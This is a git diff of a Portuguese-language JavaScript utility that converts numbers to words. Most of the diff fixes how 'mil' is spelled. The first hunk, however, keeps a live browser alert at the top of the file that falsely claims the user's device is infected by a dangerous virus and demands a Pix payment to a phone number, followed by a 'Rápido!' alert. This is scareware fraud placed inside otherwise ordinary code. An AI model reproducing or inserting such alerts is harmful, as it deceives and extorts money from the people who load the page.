@@ -1,4 +1,4 @@
-alert('Seu aparelho foi infectado por um vírus muito perigoso, para resolver o problema envie um Pix para o número (11) 94452-5127');
+alert(`Seu aparelho foi infectado por um vírus muito perigoso, para resolver o problema envie um Pix para o número (11) 94452-5127`);
 
 alert('Rápido!');
 
@@ -73,6 +73,11 @@ export function numeroParaExtenso(numero) {
             let textoGrupo = converterCentenas(grupo);
             if (i > 0) {
                 let palavra = unidadesGrandes[i] || "";
+                
+                if(i === 1 && grupo === 1){
+                    textoGrupo = "mil";
+
+                }else {
 
                 // Plural correto (menos "mil")
                 if (grupo > 1 && i > 1) {
@@ -80,9 +85,10 @@ export function numeroParaExtenso(numero) {
                         palavra = palavra.replace("ão", "ões");
                     }
                 }
-
+            
                 textoGrupo += " " + palavra;
             }
+        }
             partes.unshift(textoGrupo);
         }
         num = Math.floor(num / 1000);
